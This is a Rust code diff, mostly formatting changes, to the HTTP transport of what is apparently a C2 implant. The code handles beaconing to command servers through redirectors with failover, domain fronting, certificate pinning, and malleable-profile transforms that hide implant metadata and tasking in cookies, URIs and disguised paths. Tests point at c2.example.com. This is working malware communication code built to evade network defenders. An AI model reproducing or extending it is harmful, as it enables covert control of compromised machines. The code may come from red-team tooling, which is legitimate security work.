@@ -34,14 +34,13 @@ use async_trait::async_trait;
 use base64::Engine;
 use common::{CryptoSession, Message, Transport};
 use sha2::{Digest, Sha256};
-use subtle::ConstantTimeEq;
 use std::sync::atomic::{AtomicUsize, Ordering};
 use std::sync::Arc;
+use subtle::ConstantTimeEq;
 use tokio::time::Duration;
 
 use crate::malleable::{
-    DeliveryMethod, HttpTransactionConfig, MalleableProfile as AgentMalleableProfile,
-    TransformType,
+    DeliveryMethod, HttpTransactionConfig, MalleableProfile as AgentMalleableProfile, TransformType,
 };
 
 // ── Redirector Configuration ─────────────────────────────────────────────────
@@ -113,9 +112,7 @@ impl FailoverState {
     /// Get the current endpoint URL.
     fn current_url(&self) -> &str {
         match &self.active {
-            ActiveEndpoint::Redirector(idx) => {
-                &self.redirectors[*idx].url
-            }
+            ActiveEndpoint::Redirector(idx) => &self.redirectors[*idx].url,
             ActiveEndpoint::DirectC2 => &self.direct_c2_url,
         }
     }
@@ -123,9 +120,7 @@ impl FailoverState {
     /// Get extra headers for the current endpoint.
     fn current_headers(&self) -> Option<&std::collections::HashMap<String, String>> {
         match &self.active {
-            ActiveEndpoint::Redirector(idx) => {
-                Some(&self.redirectors[*idx].headers)
-            }
+            ActiveEndpoint::Redirector(idx) => Some(&self.redirectors[*idx].headers),
             ActiveEndpoint::DirectC2 => None,
         }
     }
@@ -134,9 +129,7 @@ impl FailoverState {
     /// is a redirector with one configured.
     fn current_front_domain(&self) -> Option<&str> {
         match &self.active {
-            ActiveEndpoint::Redirector(idx) => {
-                self.redirectors[*idx].front_domain.as_deref()
-            }
+            ActiveEndpoint::Redirector(idx) => self.redirectors[*idx].front_domain.as_deref(),
             ActiveEndpoint::DirectC2 => None,
         }
     }
@@ -299,9 +292,7 @@ impl rustls_0_21::client::ServerCertVerifier for FingerprintVerifier {
             // that could brute-force the expected fingerprint byte-by-byte.
             let expected_lower = expected.to_lowercase();
             if !bool::from(hex_fp.as_bytes().ct_eq(expected_lower.as_bytes())) {
-                log::error!(
-                    "cert pinning: fingerprint mismatch — rejecting connection"
-                );
+                log::error!("cert pinning: fingerprint mismatch — rejecting connection");
                 return Err(rustls_0_21::Error::InvalidCertificate(
                     rustls_0_21::CertificateError::UnknownIssuer,
                 ));
@@ -319,8 +310,14 @@ impl rustls_0_21::client::ServerCertVerifier for FingerprintVerifier {
             Ok(rustls_0_21::client::ServerCertVerified::assertion())
         } else {
             // No fingerprint configured — fall back to standard WebPKI verification.
-            self.webpki
-                .verify_server_cert(end_entity, intermediates, server_name, scts, ocsp_response, now)
+            self.webpki.verify_server_cert(
+                end_entity,
+                intermediates,
+                server_name,
+                scts,
+                ocsp_response,
+                now,
+            )
         }
     }
 
@@ -347,7 +344,10 @@ impl rustls_0_21::client::ServerCertVerifier for FingerprintVerifier {
 ///
 /// P1-06: Made `pub(crate)` so `c2_doh::FingerprintVerifier` can reuse the
 /// same hostname validation logic instead of duplicating DER parsing.
-pub(crate) fn verify_cert_hostname_rustls021(der: &[u8], server_name: &rustls_0_21::ServerName) -> bool {
+pub(crate) fn verify_cert_hostname_rustls021(
+    der: &[u8],
+    server_name: &rustls_0_21::ServerName,
+) -> bool {
     let expected = match server_name {
         rustls_0_21::ServerName::DnsName(dns) => dns.as_ref().to_ascii_lowercase(),
         _ => return true, // IP address or other — skip hostname check
@@ -360,7 +360,11 @@ pub(crate) fn verify_cert_hostname_rustls021(der: &[u8], server_name: &rustls_0_
                 return true;
             }
         }
-        log::warn!("c2_http: hostname {} not found in SANs: {:?}", expected, sans);
+        log::warn!(
+            "c2_http: hostname {} not found in SANs: {:?}",
+            expected,
+            sans
+        );
         return false;
     }
     if let Some(cn) = extract_cn_minimal(der) {
@@ -394,11 +398,15 @@ fn extract_san_dns_names_minimal(der: &[u8]) -> Option<Vec<String>> {
 
     let mut pos = 0usize;
     // OCTET STRING wrapper.
-    if ext.get(pos)? != &0x04 { return None; }
+    if ext.get(pos)? != &0x04 {
+        return None;
+    }
     pos = skip_len(ext, pos)?;
 
     // SEQUENCE of GeneralNames.
-    if ext.get(pos)? != &0x30 { return None; }
+    if ext.get(pos)? != &0x30 {
+        return None;
+    }
     let seq_end = {
         let (vs, vl) = read_len(ext, pos + 1)?;
         vs + vl
@@ -411,13 +419,18 @@ fn extract_san_dns_names_minimal(der: &[u8]) -> Option<Vec<String>> {
         pos += 1;
         let (vs, vl) = read_len(ext, pos)?;
         pos = vs + vl;
-        if tag == 0x82 { // dNSName [2]
+        if tag == 0x82 {
+            // dNSName [2]
             if let Ok(s) = std::str::from_utf8(&ext[vs..vs + vl]) {
                 names.push(s.to_ascii_lowercase());
             }
         }
     }
-    if names.is_empty() { None } else { Some(names) }
+    if names.is_empty() {
+        None
+    } else {
+        Some(names)
+    }
 }
 
 /// Extract Common Name from Subject field.
@@ -425,7 +438,9 @@ fn extract_cn_minimal(der: &[u8]) -> Option<String> {
     let cn_oid: &[u8] = &[0x55, 0x04, 0x03];
     let mut p = enter_seq_min(der, 0)?;
     p = enter_seq_min(der, p)?;
-    if der.get(p) == Some(&0xa0) { p = skip_tlv_min(der, p)?; }
+    if der.get(p) == Some(&0xa0) {
+        p = skip_tlv_min(der, p)?;
+    }
     p = skip_tlv_min(der, p)?; // serial
     p = skip_tlv_min(der, p)?; // sig algo
     p = skip_tlv_min(der, p)?; // issuer
@@ -435,21 +450,38 @@ fn extract_cn_minimal(der: &[u8]) -> Option<String> {
     };
     let mut pos = enter_seq_min(der, p)?;
     while pos < subject_end.min(der.len()) {
-        if der.get(pos) != Some(&0x31) { pos = skip_tlv_min(der, pos)?; continue; }
+        if der.get(pos) != Some(&0x31) {
+            pos = skip_tlv_min(der, pos)?;
+            continue;
+        }
         let mut inner = enter_seq_min(der, pos)?;
-        let set_end = { let (vs, vl) = read_len(der, pos + 1)?; vs + vl };
+        let set_end = {
+            let (vs, vl) = read_len(der, pos + 1)?;
+            vs + vl
+        };
         while inner < set_end.min(der.len()) {
-            if der.get(inner) != Some(&0x30) { inner = skip_tlv_min(der, inner)?; continue; }
-            let attr_end = { let (vs, vl) = read_len(der, inner + 1)?; vs + vl };
+            if der.get(inner) != Some(&0x30) {
+                inner = skip_tlv_min(der, inner)?;
+                continue;
+            }
+            let attr_end = {
+                let (vs, vl) = read_len(der, inner + 1)?;
+                vs + vl
+            };
             let mut ap = read_len(der, inner + 1)?.0;
-            if der.get(ap) != Some(&0x06) { inner = attr_end; continue; }
+            if der.get(ap) != Some(&0x06) {
+                inner = attr_end;
+                continue;
+            }
             let (os, ol) = read_len(der, ap + 1)?;
             if &der[os..os + ol] == cn_oid {
                 let vp = os + ol;
                 let vt = *der.get(vp)?;
                 let (vs, vl) = read_len(der, vp + 1)?;
                 if vt == 0x0c || vt == 0x13 {
-                    return std::str::from_utf8(&der[vs..vs + vl]).ok().map(|s| s.to_ascii_lowercase());
+                    return std::str::from_utf8(&der[vs..vs + vl])
+                        .ok()
+                        .map(|s| s.to_ascii_lowercase());
                 }
             }
             inner = attr_end;
@@ -463,30 +495,47 @@ fn extract_cn_minimal(der: &[u8]) -> Option<String> {
 fn find_extension_minimal<'a>(der: &'a [u8], oid: &[u8]) -> Option<&'a [u8]> {
     let mut p = enter_seq_min(der, 0)?;
     p = enter_seq_min(der, p)?;
-    if der.get(p) == Some(&0xa0) { p = skip_tlv_min(der, p)?; }
+    if der.get(p) == Some(&0xa0) {
+        p = skip_tlv_min(der, p)?;
+    }
     p = skip_tlv_min(der, p)?; // serial
     p = skip_tlv_min(der, p)?; // sig algo
     p = skip_tlv_min(der, p)?; // issuer
     p = skip_tlv_min(der, p)?; // validity
     p = skip_tlv_min(der, p)?; // subject
     p = skip_tlv_min(der, p)?; // spki
-    if der.get(p) != Some(&0xa3) { return None; } // extensions [3]
+    if der.get(p) != Some(&0xa3) {
+        return None;
+    } // extensions [3]
     let (ext_start, ext_len) = read_len(der, p + 1)?;
     let ext_end = ext_start + ext_len;
     let mut pos = ext_start;
-    if der.get(pos) != Some(&0x30) { return None; }
+    if der.get(pos) != Some(&0x30) {
+        return None;
+    }
     let (ss, sl) = read_len(der, pos + 1)?;
     let seq_end = ss + sl;
     pos = ss;
     while pos < seq_end.min(ext_end).min(der.len()) {
-        if der.get(pos) != Some(&0x30) { pos = skip_tlv_min(der, pos)?; continue; }
-        let ext_seq_end = { let (vs, vl) = read_len(der, pos + 1)?; vs + vl };
+        if der.get(pos) != Some(&0x30) {
+            pos = skip_tlv_min(der, pos)?;
+            continue;
+        }
+        let ext_seq_end = {
+            let (vs, vl) = read_len(der, pos + 1)?;
+            vs + vl
+        };
         let mut ep = read_len(der, pos + 1)?.0;
-        if der.get(ep) != Some(&0x06) { pos = ext_seq_end; continue; }
+        if der.get(ep) != Some(&0x06) {
+            pos = ext_seq_end;
+            continue;
+        }
         let (os, ol) = read_len(der, ep + 1)?;
         if &der[os..os + ol] == oid {
             ep = os + ol;
-            if der.get(ep) == Some(&0x01) { ep = skip_tlv_min(der, ep)?; }
+            if der.get(ep) == Some(&0x01) {
+                ep = skip_tlv_min(der, ep)?;
+            }
             if der.get(ep) == Some(&0x04) {
                 let (vs, vl) = read_len(der, ep + 1)?;
                 return Some(&der[vs..vs + vl]);
@@ -499,12 +548,17 @@ fn find_extension_minimal<'a>(der: &'a [u8], oid: &[u8]) -> Option<&'a [u8]> {
 
 fn read_len(buf: &[u8], pos: usize) -> Option<(usize, usize)> {
     let first = *buf.get(pos)?;
-    if first & 0x80 == 0 { Some((pos + 1, first as usize)) }
-    else {
+    if first & 0x80 == 0 {
+        Some((pos + 1, first as usize))
+    } else {
         let n = (first & 0x7f) as usize;
-        if n == 0 || n > 4 || pos + 1 + n > buf.len() { return None; }
+        if n == 0 || n > 4 || pos + 1 + n > buf.len() {
+            return None;
+        }
         let mut l = 0usize;
-        for i in 0..n { l = (l << 8) | buf[pos + 1 + i] as usize; }
+        for i in 0..n {
+            l = (l << 8) | buf[pos + 1 + i] as usize;
+        }
         Some((pos + 1 + n, l))
     }
 }
@@ -520,7 +574,9 @@ fn skip_tlv_min(buf: &[u8], pos: usize) -> Option<usize> {
 }
 
 fn enter_seq_min(buf: &[u8], pos: usize) -> Option<usize> {
-    if buf.get(pos)? != &0x30 { return None; }
+    if buf.get(pos)? != &0x30 {
+        return None;
+    }
     read_len(buf, pos + 1).map(|(vs, _)| vs)
 }
 
@@ -675,10 +731,7 @@ impl HttpTransport {
         for redir in &failover.redirectors {
             // Determine the effective front domain for this redirector:
             // per-redirector override takes precedence over the global setting.
-            let effective_front = redir
-                .front_domain
-                .as_deref()
-                .or(front_domain.as_deref());
+            let effective_front = redir.front_domain.as_deref().or(front_domain.as_deref());
 
             if let Some(_front) = effective_front {
                 // Build a dedicated client whose TLS config will be used for
@@ -734,9 +787,7 @@ impl HttpTransport {
         failover.maybe_reconsider();
         let url = failover.current_url().to_string();
         if url.is_empty() {
-            anyhow::bail!(
-                "no C2 endpoint available; configure redirectors or direct_c2_endpoint"
-            );
+            anyhow::bail!("no C2 endpoint available; configure redirectors or direct_c2_endpoint");
         }
         Ok(url)
     }
@@ -757,13 +808,10 @@ impl HttpTransport {
         front: &str,
     ) -> reqwest::RequestBuilder {
         // Parse the URL to extract the path/query/fragment.
-        let parsed: url::Url = url.parse().unwrap_or_else(|_| {
-            format!("https://{}", url).parse().unwrap()
-        });
-        let actual_host = parsed
-            .host_str()
-            .unwrap_or("")
-            .to_string();
+        let parsed: url::Url = url
+            .parse()
+            .unwrap_or_else(|_| format!("https://{}", url).parse().unwrap());
+        let actual_host = parsed.host_str().unwrap_or("").to_string();
 
         // Rewrite URL with the front domain as the hostname.
         let mut fronted = parsed.clone();
@@ -848,10 +896,7 @@ impl HttpTransport {
 
     /// Apply the **client** (outbound) transform pipeline:
     ///   transform(payload) → prepend → append
-    fn apply_client_transform(
-        txn: &HttpTransactionConfig,
-        payload: &[u8],
-    ) -> Vec<u8> {
+    fn apply_client_transform(txn: &HttpTransactionConfig, payload: &[u8]) -> Vec<u8> {
         let transformed = if txn.client.mask_stride > 0 {
             txn.client
                 .transform
@@ -873,10 +918,7 @@ impl HttpTransport {
 
     /// Reverse the **server** (inbound) transform pipeline:
     ///   strip prepend → strip append → inverse transform
-    fn reverse_server_transform(
-        txn: &HttpTransactionConfig,
-        data: &[u8],
-    ) -> Result<Vec<u8>> {
+    fn reverse_server_transform(txn: &HttpTransactionConfig, data: &[u8]) -> Result<Vec<u8>> {
         let prepend_bytes = Self::unescape_crlf(&txn.server.prepend);
         let append_bytes = Self::unescape_crlf(&txn.server.append);
 
@@ -967,9 +1009,7 @@ impl HttpTransport {
         let transformed_str = String::from_utf8_lossy(&transformed_id).to_string();
 
         match delivery {
-            DeliveryMethod::Cookie => {
-                req.header("Cookie", format!("{}={}", key, transformed_str))
-            }
+            DeliveryMethod::Cookie => req.header("Cookie", format!("{}={}", key, transformed_str)),
             DeliveryMethod::UriAppend => {
                 uri.push_str(&format!("?{}={}", key, transformed_str));
                 req
@@ -1059,10 +1099,7 @@ impl HttpTransport {
                             .split(';')
                             .find_map(|part| part.trim().strip_prefix(&format!("{}=", key)))
                         {
-                            return match output
-                                .transform
-                                .decode(cookie_val.as_bytes())
-                            {
+                            return match output.transform.decode(cookie_val.as_bytes()) {
                                 Ok(decoded) => decoded,
                                 Err(_) => cookie_val.as_bytes().to_vec(),
                             };
@@ -1163,12 +1200,8 @@ impl HttpTransport {
                         e,
                         current_delay
                     );
-                    crate::memory_guard::guarded_sleep(
-                        Duration::from_secs(current_delay),
-                        None,
-                        0,
-                    )
-                    .await?;
+                    crate::memory_guard::guarded_sleep(Duration::from_secs(current_delay), None, 0)
+                        .await?;
                     delay *= 2;
                     if delay > 64 {
                         delay = 64;
@@ -1192,11 +1225,10 @@ impl Transport for HttpTransport {
         let endpoint = self.resolve_endpoint()?;
 
         // Use http_post for task output.
-        let txn = self
-            .profile
-            .http_post
-            .as_ref()
-            .ok_or_else(|| anyhow!("http_post transaction not configured in malleable profile"))?;
+        let txn =
+            self.profile.http_post.as_ref().ok_or_else(|| {
+                anyhow!("http_post transaction not configured in malleable profile")
+            })?;
 
         let uri = Self::next_uri(txn, &self.post_uri_idx);
 
@@ -1216,8 +1248,8 @@ impl Transport for HttpTransport {
 
         // Build the request with the profile's verb, using domain-fronting
         // and redirector headers as needed.
-        let method = reqwest::Method::from_bytes(txn.verb.as_bytes())
-            .unwrap_or(reqwest::Method::POST);
+        let method =
+            reqwest::Method::from_bytes(txn.verb.as_bytes()).unwrap_or(reqwest::Method::POST);
         let req = self.build_request_for_endpoint(method.clone(), &endpoint, &final_uri);
 
         // Apply profile headers.
@@ -1254,7 +1286,9 @@ impl Transport for HttpTransport {
                 };
                 log::warn!(
                     "send failed on {}: {}. Backing off {:?}",
-                    endpoint, e, backoff,
+                    endpoint,
+                    e,
+                    backoff,
                 );
                 crate::memory_guard::guarded_sleep(backoff, None, 0).await?;
                 Err(e)
@@ -1273,11 +1307,10 @@ impl Transport for HttpTransport {
         let endpoint = self.resolve_endpoint()?;
 
         // Use http_get for checkins/tasking.
-        let txn = self
-            .profile
-            .http_get
-            .as_ref()
-            .ok_or_else(|| anyhow!("http_get transaction not configured in malleable profile"))?;
+        let txn =
+            self.profile.http_get.as_ref().ok_or_else(|| {
+                anyhow!("http_get transaction not configured in malleable profile")
+            })?;
 
         let uri = Self::next_uri(txn, &self.get_uri_idx);
 
@@ -1311,8 +1344,8 @@ impl Transport for HttpTransport {
 
         // Build the request with the profile's verb, using domain-fronting
         // and redirector headers as needed.
-        let method = reqwest::Method::from_bytes(txn.verb.as_bytes())
-            .unwrap_or(reqwest::Method::GET);
+        let method =
+            reqwest::Method::from_bytes(txn.verb.as_bytes()).unwrap_or(reqwest::Method::GET);
         let req = self.build_request_for_endpoint(method.clone(), &endpoint, &final_uri);
 
         // Apply profile headers.
@@ -1345,7 +1378,9 @@ impl Transport for HttpTransport {
                 };
                 log::warn!(
                     "recv failed on {}: {}. Backing off {:?}",
-                    endpoint, e, backoff,
+                    endpoint,
+                    e,
+                    backoff,
                 );
                 crate::memory_guard::guarded_sleep(backoff, None, 0).await?;
                 anyhow::bail!("recv failed after advancing endpoint: {}", e);
@@ -1424,8 +1459,8 @@ impl Transport for HttpTransport {
 mod tests {
     use super::*;
     use crate::malleable::{
-        DeliveryMethod, GlobalConfig, HttpTransformConfig, MetadataConfig,
-        MalleableProfile as AgentMalleableProfile, ProfileInfo, SslConfig,
+        DeliveryMethod, GlobalConfig, HttpTransformConfig,
+        MalleableProfile as AgentMalleableProfile, MetadataConfig, ProfileInfo, SslConfig,
     };
     use std::collections::HashMap;
 
@@ -1441,6 +1476,7 @@ mod tests {
                 user_agent: "TestAgent/1.0".to_string(),
                 jitter: 10,
                 sleep_time: 30,
+                sleep_time_ms: None,
                 dns_idle: "0.0.0.0".to_string(),
                 dns_sleep: 0,
             },
@@ -1451,10 +1487,7 @@ mod tests {
                 sni: String::new(),
             },
             http_get: Some(HttpTransactionConfig {
-                uri: vec![
-                    "/api/v1/data".to_string(),
-                    "/static/asset.js".to_string(),
-                ],
+                uri: vec!["/api/v1/data".to_string(), "/static/asset.js".to_string()],
                 verb: "GET".to_string(),
                 headers: {
                     let mut m = HashMap::new();
@@ -1483,10 +1516,7 @@ mod tests {
                 verb: "POST".to_string(),
                 headers: {
                     let mut m = HashMap::new();
-                    m.insert(
-                        "Content-Type".to_string(),
-                        "application/json".to_string(),
-                    );
+                    m.insert("Content-Type".to_string(), "application/json".to_string());
                     m
                 },
                 uri_append: None,
@@ -1745,9 +1775,7 @@ mod tests {
         let mut uri = "/api/v1/data".to_string();
         let mut body = Vec::new();
         let req = reqwest::Client::new().get("https://c2.example.com/api/v1/data");
-        let _req = transport.apply_metadata_delivery(
-            txn, req, &encrypted_id, &mut uri, &mut body,
-        );
+        let _req = transport.apply_metadata_delivery(txn, req, &encrypted_id, &mut uri, &mut body);
 
         // The URI should now contain "?id=" followed by the Base64Url-encoded
         // encrypted ID.
@@ -1773,6 +1801,9 @@ mod tests {
         );
 
         // Body should be untouched (UriAppend doesn't write to body).
-        assert!(body.is_empty(), "body should be empty for UriAppend delivery");
+        assert!(
+            body.is_empty(),
+            "body should be empty for UriAppend delivery"
+        );
     }
 }
